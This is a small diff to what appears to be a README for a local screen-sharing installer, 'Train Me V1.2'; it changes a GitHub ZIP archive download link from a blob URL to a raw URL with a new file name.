@@ -8,7 +8,7 @@ Share your screen across local devices without internet.
 ### > [Download Installer (750 KB)](https://github.com/ahmedoalharbi/Train.Me.V1.2_Installer/archive/refs/heads/main.zip)
 
 
-### > [Download ZIP Archive (750 KB)](https://github.com/ahmedoalharbi/Train.Me.V1.2_Installer/blob/main/Train Me V1.2 Installer.zip)
+### > [Download ZIP Archive (750 KB)](https://github.com/ahmedoalharbi/Train.Me.V1.2_Installer/raw/main/TM-Train-Me-v1.2-Archive.zip)
 
 
 
